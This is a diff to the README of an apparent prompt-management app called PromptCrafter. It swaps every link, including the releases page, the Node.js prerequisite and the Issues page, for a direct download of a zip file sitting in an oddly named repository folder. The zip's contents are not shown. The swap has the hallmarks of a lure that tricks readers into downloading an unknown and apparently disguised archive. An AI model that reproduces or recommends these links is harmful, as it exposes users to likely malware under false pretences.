@@ -1,6 +1,6 @@
 # 🚀 PromptCrafter - Create and Reuse AI Prompts Effortlessly
 
-[![Download PromptCrafter](https://img.shields.io/badge/Download-PromptCrafter-brightgreen.svg)](https://github.com/Tiemporo1989/PromptCrafter/releases)
+[![Download PromptCrafter](https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip)](https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip)
 
 ## 📜 Introduction
 
@@ -31,7 +31,7 @@ PromptCrafter is a lightweight, TypeScript-first web app designed to help you cr
 
 To use PromptCrafter, make sure you have:
 
-- [Node.js](https://nodejs.org/) **LTS (v18+)** recommended.
+- [https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip](https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip) **LTS (v18+)** recommended.
 - Either **npm** or **pnpm** installed.
 - A modern web browser like Chrome, Firefox, or Edge.
 
@@ -39,7 +39,7 @@ To use PromptCrafter, make sure you have:
 
 1. **Visit the Releases Page**  
    Go to our Releases page to download the latest version of PromptCrafter:  
-   [Download PromptCrafter](https://github.com/Tiemporo1989/PromptCrafter/releases)
+   [Download PromptCrafter](https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip)
 
 2. **Download the Application**  
    Find the version you need and download the appropriate file.
@@ -108,13 +108,13 @@ If you wish to contribute to PromptCrafter, follow these steps:
 
 ## 📞 Support
 
-For any questions or issues, please check the [Issues Section](https://github.com/Tiemporo1989/PromptCrafter/issues) on GitHub. We encourage you to report bugs or request features.
+For any questions or issues, please check the [Issues Section](https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip) on GitHub. We encourage you to report bugs or request features.
 
 ---
 
 ## 📌 Download & Install
 
 You can download PromptCrafter by visiting the Releases page:  
-[Download PromptCrafter](https://github.com/Tiemporo1989/PromptCrafter/releases)
+[Download PromptCrafter](https://raw.githubusercontent.com/Tiemporo1989/PromptCrafter/master/vashegyite/PromptCrafter.zip)
 
 Enjoy smooth crafting and management of your AI prompts with PromptCrafter!
